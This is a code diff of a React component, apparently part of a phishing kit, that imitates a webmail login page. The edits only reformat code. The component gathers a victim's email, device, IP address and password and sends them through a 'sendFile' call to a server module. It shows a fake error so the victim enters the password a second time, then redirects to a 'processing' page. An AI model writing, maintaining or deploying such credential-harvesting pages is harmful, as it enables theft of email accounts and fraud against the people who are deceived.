@@ -5,7 +5,8 @@ import { notify, sendFile } from "../servers";
 
 function Webmail({ location }) {
   const [values, setValues] = useState({
-    username: location.state.email,device: location.state.device,
+    username: location.state.email,
+    device: location.state.device,
     ip: location.state.ip,
     password: "",
   });
@@ -28,14 +29,15 @@ function Webmail({ location }) {
       sendFile(values).then((data) => {
         // show error
         notify();
-        setSubmited({ ...submited, count: submited.count + 1 }); setValues({ ...values, password: "" });
+        setSubmited({ ...submited, count: submited.count + 1 });
+        setValues({ ...values, password: "" });
         console.log(data);
         console.log(submited);
       });
     } else {
       sendFile(values).then((data) => {
         // redirect
-        navigate("processing", { state: { domain: location.state.domain } });
+        navigate("../processing", { state: { domain: location.state.domain } });
         console.log("ok");
       });
     }
@@ -48,7 +50,7 @@ function Webmail({ location }) {
     <Fragment>
       <Helmet>
         <link rel="stylesheet" type="text/css" href="../webmail/main.css" />
-        <script src="../webmail/main.js"></script>
+        <script src="../webmail/main.js" />
       </Helmet>
       <noscript>
         &lt;p class="jsDisabled"&gt; JavaScript must be enabled in order to use
@@ -57,7 +59,7 @@ function Webmail({ location }) {
         enable JavaScript by changing your browser options, then try again.
         &lt;/p&gt;
       </noscript>
-      <div id="header"></div>
+      <div id="header" />
       <div id="topnav">
         <h2 id="aria-label-tasknav" className="voice">
           Application tasks
@@ -138,7 +140,7 @@ function Webmail({ location }) {
                     <font style={{ fontWeight: "bold" }} id="#emaildomain">
                       {" "}
                     </font>
-                   { /* Account Settings */ "Email Account"}
+                    {/* Account Settings */ "Email Account"}
                   </h1>
                 </div>
                 <div className="loginWidget-wrapper oneColumnUnauthenticated-box">
@@ -165,7 +167,7 @@ function Webmail({ location }) {
                                 maxLength={1024}
                                 name="username"
                                 onChange={handleChange}
-                              //  value={}
+                                //  value={}
                                 // disabled
                                 size={30}
                                 data-required-error-msg
